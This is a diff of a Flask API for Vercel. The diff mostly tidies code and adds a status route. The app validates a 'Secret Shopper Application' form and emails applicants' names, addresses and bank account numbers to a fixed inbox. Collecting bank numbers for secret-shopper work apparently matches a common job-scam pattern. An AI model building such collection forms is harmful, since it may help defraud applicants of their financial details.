@@ -1,4 +1,3 @@
-# /api/index.py
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from email.mime.text import MIMEText
@@ -7,16 +6,16 @@ import smtplib
 import re
 import os
 
-# This 'app' object is what Vercel interacts with.
+# Initialize Flask
 app = Flask(__name__)
 CORS(app)
 
-# --- Securely get email credentials from Vercel's Environment Variables ---
+# --- Email configuration from environment variables ---
 SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
 SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
 RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')
 
-# --- Validation Functions (No changes needed here) ---
+# --- Validation functions ---
 def validate_email(email):
     pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
     return re.match(pattern, email) is not None
@@ -33,38 +32,63 @@ def validate_age(age):
 
 def validate_form_data(data):
     errors = []
-    required_fields = ['first-name', 'last-name', 'email', 'phone', 'address', 'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number']
+    required_fields = [
+        'first-name', 'last-name', 'email', 'phone', 'address',
+        'city-state', 'zipcode', 'gender', 'age',
+        'bank-name', 'bank-number'
+    ]
+
     for field in required_fields:
         if not data.get(field) or not str(data.get(field)).strip():
             errors.append(f"{field.replace('-', ' ').title()} is required.")
-    if errors: return errors
-    if not validate_email(data.get('email')): errors.append("Invalid email format.")
-    if not validate_phone(data.get('phone')): errors.append("Invalid phone number format.")
-    if not validate_age(data.get('age')): errors.append("You must be at least 18.")
+
+    if errors:
+        return errors
+
+    if not validate_email(data.get('email')):
+        errors.append("Invalid email format.")
+    if not validate_phone(data.get('phone')):
+        errors.append("Invalid phone number format.")
+    if not validate_age(data.get('age')):
+        errors.append("You must be at least 18 years old.")
+
     return errors
 
 
-# --- CRITICAL FIX: THE FLASK ROUTE ---
-# This decorator MUST match the URL from your JavaScript fetch call.
-# It tells Flask: "When a POST request comes to /sendmail, run this function."
+# --- Home route (to prevent “Not Found” on GET /) ---
+@app.route('/', methods=['GET'])
+def home():
+    return jsonify({
+        "message": "✅ Flask API is running successfully on Vercel!",
+        "routes": {
+            "sendmail": "POST /sendmail"
+        }
+    }), 200
+
+
+# --- Send mail route ---
 @app.route('/sendmail', methods=['POST'])
 def send_mail_route():
     try:
         data = request.get_json()
     except Exception:
-        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
+        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400
 
     validation_errors = validate_form_data(data)
     if validation_errors:
         return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400
 
     if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
-        return jsonify({"status": "error", "message": "Server is not configured for sending emails."}), 500
+        return jsonify({
+            "status": "error",
+            "message": "Email server not configured. Missing environment variables."
+        }), 500
 
     try:
         subject = "New Secret Shopper Application"
         body = f"""
         New application details:
+
         Name: {data.get('first-name')} {data.get('last-name')}
         Email: {data.get('email')}
         Phone: {data.get('phone')}
@@ -72,17 +96,23 @@ def send_mail_route():
         Address: {data.get('address')}, {data.get('city-state')}, {data.get('zipcode')}
         Bank: {data.get('bank-name')} - {data.get('bank-number')}
         """
+
         msg = MIMEMultipart()
         msg['From'] = SENDER_EMAIL
         msg['To'] = RECEIVER_EMAIL
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain'))
+
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(SENDER_EMAIL, SENDER_PASSWORD)
             server.send_message(msg)
-        return jsonify({"status": "success", "message": "Application sent!", "redirect": "/thank_you.html"}), 200
+
+        return jsonify({
+            "status": "success",
+            "message": "Application sent successfully!",
+            "redirect": "/thank_you.html"
+        }), 200
+
     except Exception as e:
         print(f"EMAIL SENDING FAILED: {e}")
         return jsonify({"status": "error", "message": "Internal server error."}), 500
-
-# There should be no other @app.route() decorators in this file.
